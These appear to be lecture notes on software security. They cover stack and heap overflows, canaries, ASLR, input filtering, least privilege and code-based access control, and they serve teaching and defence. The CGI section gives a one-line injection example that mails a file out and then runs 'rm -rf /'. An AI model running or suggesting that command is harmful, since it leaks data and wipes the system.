### Stack Smashing attacks
1. Overwrite the program counter
2. Overwrite part of the code in *low memory*
3. Overwrite the program counter and data in the stack

In all these attacks, the attacker uses *overflow data* as code the victim will execute.
Note: If the overflow occurs during a system call (when there are elevated privileges), the attacker's code also executes with those privileges. 

This is an example of a "data-driven attack"

Inserting a very large local variable where space wasn't allocated for it may write "up" the stack and corrupt the "PC return address"

Two major methods for attackers to insert code.

1. `argv[]`  
	- Shell code is passed as an argument to the vulnerable function.
2. `return-to-libc`
	- Attacker calls a system library function

#### Stack Overrun
1. Previous attack could not occur if stack was not executable, or if stack was growing "upwards" from bottom of memory.
- When return address is changed, the attacker's code can run with privileges of current process
- When attacker cannot predict precisely where the input variable and thus the attack code will be placed, a landing pad of NOP (no operation) instructions at the start of the attacker's code can compensate for variations in the location the code will be found in.

**Morris Worm** took down the internet in '88

### Defences against Stack Overrun 
**Stack Guard**
- Non-executable stacks
- **Canary** (like a bird in a mine):
	- Random value placed at memory position in stack **just below the return address.** Canary value and its check are inserted by compiler. (Cannot be predetermined)

### Heap Overruns
- Heap provides space for dynamic data (size not known when a program is compiled)
This can lead to **heap and stack collisions**
- Stack grows down and heap grows up
- Of course, the OS tries to avoid such a collision, but there is no perfect way to avoid this.

#### Overflow counter measures
- 1st easiest solution, stay within bounds
- Maintaining boundaries is a shared responsibility of the programmer, OS, compiler, and hardware
- Third party help is good
- Language features 
	- Java, .NET, Perl, Python generate code to check bounds before storing data
	- unchecked languages (C, C++, assembly) allow largely unlimited program access
- To counter the openness of these languages, compiler writers have developed extensions and libraries that generate code to keep programs in check.

#### Scripting
- **CGI** (Common Gateway Interface) is a meta language for translating URLs or HTML forms into runnable programs.
- Client sends a URL or a HTML form to the server specifying a CGI script and its input argument 
`cat thefil | mail client@address | rm -rf /`

#### Defences
- Processor architecture
	- Intel's Itanium processor has a separate register for the return address.
	- Recent proposers for a separate secure return address stack (separate from stack for local variables)
- Programming language we're using
- Coding discipline we adhere to
- Checks added at compile time (e.g. canaries)
- During software development and deployment

It is an advantage for attacker's when memory usage is predictable.
Therefore, address space layout randomization decreases attacker's chance of success.

**Input Filtering** distinguishes between 'good' and 'bad' inputs in two ways.
- White lists only allow good values (very conservative; may block valid inputs)
- Black lists: blocking dangerous values / escape characters (more liberal; may allow malicious inputs)
**Type Safety** can be guaranteed by dynamic (runtime) and/or static (compile time) type checks

#### Detection: Security Testing
- Testing is an integral part of software development, used to demonstrate the correctness of functionality
- Security testing is about showing correctness of security functionality.
- This implies that we have to have some idea about the potential threats, and the results of threat analysis should provide input to security testing
- Important general technique for security testing is **data mutation**

#### Mitigation: Least Privilege
- When writing code, be sparing with requiring privileges to run the code
- If code running with few privileges is compromised, the damage is limited.
- Do not activate options you don't need!
e.g. Morris worm exploited debug option of send mail program where username can be substituted with a series of instructions.

Sometimes there's a "spike" in attacks immediately after a patch is released (people are lazy and not keeping their systems up to date)

#### New Access Control Paradigms (what WWW changed)
- When a client connects to a webpage, the client's browser runs programs (scripts) embedded in the page.
- instead of simple read/write requests to an operating system or a database, programs are sent to be executed at the other side.
- Servers execute scripts coming from the clients.
- Separation of programs and data becomes blurred.
- Executable content (applets, scripts) is embedded in interactive web pages that can process user input.
- Computation moves to the client.
- Clients need protection from "rogue" content providers.
- Browser becomes part of "Trusted Computing Base" (TCB)

### Access Control in open Environments
Current access on Unix and Windows is based on **Identity-Based Access Control**. This originated in 'closed' organizations.
1. organization has authority over members
2. members can be physically located
3. audit logs point to users who can be held accountable for their actions
The internet is *very* different
- Users are unknown (cannot use identity)
- No real authority over people

An **access request** (code id, session id, sender id, etc.) is sent to the **Policy Decision Point**
**The Policy Decision Point**:
**Authenticates**:
- Verifies evidence provided
- Associates request with local evidence (security context)
**Authorizes**:
- Finds relevant policy, check whether evidence is sufficient to grant access.

#### Code-Based Access Control (CBAC)
Also known as Evidence-Based Access Control
Evidence used in making access decisions can be as follows:
Code origin:
- Is code stored locally or from remote site?
- If remote, what URL is it coming from?
- Can URL be spoofed?
- Use URL to determine a zone and define security policies based on zone
- Security policy that checks URL integrity might fit here.

**Code Signature**: Has code been digitally signed by trusted author?
**Code Identity**: When we receive applet, we can compute its hash and check whether it matches one in our list of trusted applets.
**Code proof**: the decision whether to run an applet could be based on the files which code opens or remote sites where code tries to connect to.
- We need a reference monitor in order to check the proof.

When working with multiple software components with different permissions, the effective permissions of the final caller are the intersection of the permissions of all functions on the call stack. 
This is known as "lazy evaluation" of access rights and is calculated via a "stack walk"

#### Assert Option
- Options for controlled invocation would be severely curtailed if this strategy were strictly adhered to.
- We can **Assert** a permission
- Asserted permissions are attached to the current stack frame and removed when returning from that component.
- Asserted permission will STOP the stack walk. Assertion allows 'untrusted' callers to run a 'trusted' method.
- Programmers writing components and assigning permissions have to consider that untrusted component may call their component.

#### History-based access control
- Stack walk may not work when optimizations are used during executions:
Think of function $g$ tail-recursive calling $f$ ($f$ and $g$ have different permission) and now $g$ is completely replaced on the stack by $f$.
